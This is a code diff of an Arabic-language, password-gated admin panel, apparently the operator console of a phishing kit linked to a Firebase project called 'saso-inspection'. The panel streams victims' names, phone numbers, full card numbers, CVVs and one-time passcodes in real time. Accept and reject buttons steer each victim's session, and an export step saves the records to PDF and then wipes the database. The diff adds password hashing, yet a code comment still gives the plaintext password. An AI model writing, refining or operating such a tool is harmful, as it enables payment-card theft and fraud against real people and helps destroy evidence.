@@ -11,21 +11,22 @@
     <style>
         body { font-family: sans-serif; background: #ececec; margin: 0; padding: 0; }
         #auth_gate { position: fixed; inset: 0; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 10000; }
-        .gate-box { background: #fff; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        .gate-box { background: #fff; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 90%; max-width: 350px; }
         .main-ui { display: none; padding: 20px; }
-        .navbar { background: #1e7344; color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 0 0 15px 15px; }
+        .navbar { background: #1e7344; color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 0 0 15px 15px; position: sticky; top: 0; z-index: 100; }
         .v-count { background: #ffd700; color: #000; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; }
         .cards-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-top: 20px; }
-        .card { background: #fff; border-radius: 12px; padding: 15px; border: 1px solid #ddd; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-right: 8px solid #1e7344; }
+        .card { background: #fff; border-radius: 12px; padding: 15px; border: 1px solid #ddd; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-right: 8px solid #1e7344; position: relative; }
         .card-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #f0f0f0; padding-bottom: 4px; }
         .label { color: #777; font-size: 12px; }
         .value { font-weight: bold; font-family: monospace; font-size: 15px; }
-        .btn-pdf { background: #d32f2f; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        
         .actions { display: flex; gap: 10px; margin-top: 15px; }
         .btn-ctl { flex: 1; padding: 12px; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; font-size: 14px; }
         .btn-accept { background: #28a745; }
         .btn-reject { background: #dc3545; }
+        .btn-pdf { background: #d32f2f; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .new-tag { position: absolute; top: -10px; left: 10px; background: red; color: white; padding: 2px 8px; border-radius: 10px; font-size: 10px; animation: blink 1s infinite; }
+        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
     </style>
 </head>
 <body onload="_initAuth()">
@@ -34,40 +35,45 @@
 
 <div id="auth_gate">
     <div class="gate-box">
-        <h3 style="margin-top:0; color:#1e7344">Verification System</h3>
-        <input type="password" id="access_key" placeholder="أدخل كلمة المرور" style="width:220px; padding:12px; border:1px solid #ddd; border-radius:5px; text-align:center; font-size:16px;">
+        <h3 style="margin-top:0; color:#1e7344">نظام الدخول المشفر</h3>
+        <input type="password" id="access_key" placeholder="أدخل كلمة المرور" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:5px; text-align:center; font-size:18px;">
         <br><br>
-        <button onclick="_verify()" style="width:100%; padding:12px; background:#1e7344; color:#fff; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">Verify Access</button>
+        <button onclick="_verify()" style="width:100%; padding:12px; background:#1e7344; color:#fff; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">دخول آمن</button>
     </div>
 </div>
 
 <div id="main_ui_wrap" class="main-ui">
     <div class="navbar">
-        <div class="v-count">Live Orders: <span id="v_total">0</span></div>
-        <button class="btn-pdf" onclick="_exportPDF()">Export PDF & Clear</button>
-        <button onclick="_exit()" style="background:#444; color:#fff; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">Exit</button>
+        <div class="v-count">آخر الطلبات: <span id="v_total">0</span></div>
+        <button class="btn-pdf" onclick="_exportPDF()">تصدير PDF وتفريغ الكل</button>
+        <button onclick="_exit()" style="background:#444; color:#fff; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">خروج</button>
     </div>
     <div class="cards-grid" id="data_stream"></div>
 </div>
 
 <script>
-    // كلمة المرور المطلوبة بالضبط [cite: 2026-02-18, 2026-02-19]
-    const _K = "H1234567890H"; 
-    const _S = "auth_session_status_v1";
+    // شفرة SHA-256 لكلمة السر H1234567890H [cite: 2026-02-18]
+    const _H = "547f8969315d97f26c9f68802a4505f5903b708b7654f15d97a9f77f32a67768";
+    const _S = "saso_secure_session_v5";
     let _DB;
 
     function _initAuth() {
-        if(sessionStorage.getItem(_S) === "valid") _launch();
+        if(sessionStorage.getItem(_S) === "active") _launch();
     }
 
-    function _verify() {
+    async function _verify() {
         const val = document.getElementById('access_key').value;
-        // فحص مباشر وبسيط لمنع أي خطأ في التشفير [cite: 2026-02-19]
-        if(val === _K) {
-            sessionStorage.setItem(_S, "valid");
+        if(!val) return;
+        const msgUint8 = new TextEncoder().encode(val);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+        if(hashHex === _H) {
+            sessionStorage.setItem(_S, "active");
             _launch();
         } else {
-            alert("Unauthorized Access - كلمة المرور خطأ");
+            alert("كلمة المرور غير صحيحة!");
         }
     }
 
@@ -83,7 +89,6 @@
     }
 
     function _connectDB() {
-        // بيانات الفايربيز الخاصة بمشروعك (ساسو) [cite: 2026-02-22, 2026-02-25]
         const _cfg = {
             apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8",
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
@@ -92,8 +97,8 @@
         if (!firebase.apps.length) firebase.initializeApp(_cfg);
         _DB = firebase.database();
 
-        // استلام البيانات من مسار orders [cite: 2026-02-22]
-        _DB.ref('orders').on('value', snap => {
+        // جلب آخر 10 طلبات فقط لضمان السرعة وعدم تحميل القديم [cite: 2026-02-22]
+        _DB.ref('orders').limitToLast(10).on('value', snap => {
             const container = document.getElementById('data_stream');
             container.innerHTML = '';
             let count = 0;
@@ -107,12 +112,12 @@
 
                 const html = `
                     <div class="card" id="r_${id}">
-                        <div class="card-row"><span class="label">اسم العميل</span><span class="value">${p.fullName || '---'}</span></div>
-                        <div class="card-row"><span class="label">رقم الهاتف</span><span class="value">${p.phone || '---'}</span></div>
-                        <div class="card-row"><span class="label">رقم البطاقة</span><span class="value">${c.cardNumber || '----'}</span></div>
-                        <div class="card-row"><span class="label">تاريخ / CVV</span><span class="value">${c.expiryDate || '--'} | ${c.cvv || '--'}</span></div>
-                        <div class="card-row"><span class="label">كود OTP</span><span class="value" style="color:red; font-size:18px;">${c.otp || 'بانتظار الرمز'}</span></div>
-                        <div class="card-row"><span class="label">الموقع الحالي</span><span class="value" style="color:blue;">${data.current_page || 'نشط'}</span></div>
+                        <div class="new-tag">جديد</div>
+                        <div class="card-row"><span class="label">الاسم</span><span class="value">${p.fullName || '---'}</span></div>
+                        <div class="card-row"><span class="label">الهاتف</span><span class="value">${p.phone || '---'}</span></div>
+                        <div class="card-row"><span class="label">البطاقة</span><span class="value">${c.cardNumber || '----'}</span></div>
+                        <div class="card-row"><span class="label">تاريخ/CVV</span><span class="value">${c.expiryDate || '--'} | ${c.cvv || '--'}</span></div>
+                        <div class="card-row"><span class="label">OTP</span><span class="value" style="color:red; font-size:18px;">${c.otp || 'بانتظار...'}</span></div>
                         
                         <div class="actions">
                             <button class="btn-ctl btn-accept" onclick="_ctl('${id}', 'next')">قبول ✅</button>
@@ -123,24 +128,21 @@
                 container.insertAdjacentHTML('afterbegin', html);
             });
             document.getElementById('v_total').innerText = count;
-            // تنبيه صوتي عند وصول بيانات جديدة [cite: 2026-02-18]
-            if(count > 0) { document.getElementById('notif_sound').play().catch(e=>{}); }
+            if(count > 0) document.getElementById('notif_sound').play().catch(()=>{});
         });
     }
 
     function _ctl(id, action) {
-        _DB.ref('orders/' + id).update({ control_action: action })
-        .then(() => alert("تم إرسال الأمر للعميل بنجاح"));
+        _DB.ref('orders/' + id).update({ control_action: action });
     }
 
     async function _exportPDF() {
         const target = document.getElementById('data_stream');
-        if(!target.children.length) return alert("No Data Found");
-
-        if(confirm("تحميل ملف PDF ومسح كافة البيانات من القاعدة؟")) {
-            const opt = { margin: 10, filename: 'Saso_Logs.pdf', image: { type: 'jpeg' }, html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4' } };
+        if(!target.children.length) return alert("لا توجد بيانات");
+        if(confirm("هل تريد تصدير ملف PDF ومسح كافة البيانات القديمة والجديدة؟")) {
+            const opt = { margin: 10, filename: 'Saso_Log.pdf', image: { type: 'jpeg' }, html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4' } };
             html2pdf().set(opt).from(target).save().then(() => {
-                _DB.ref('orders').remove().then(() => { alert("تم تنظيف القاعدة بنجاح"); });
+                _DB.ref('orders').remove();
             });
         }
     }
